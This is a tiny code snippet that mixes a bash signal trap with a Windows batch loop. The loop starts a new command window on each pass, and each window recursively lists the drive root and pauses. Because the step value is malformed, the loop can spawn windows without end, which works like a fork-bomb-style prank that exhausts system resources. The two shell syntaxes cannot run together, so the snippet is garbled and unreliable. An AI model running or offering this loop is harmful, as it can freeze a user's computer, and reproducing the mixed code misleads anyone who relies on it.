trap 'echo got SIGINT' SIGINT 
for /l %%x in (1, .5, 1000) do (
    start cmd /c "cd / && dir /s && pause"
   )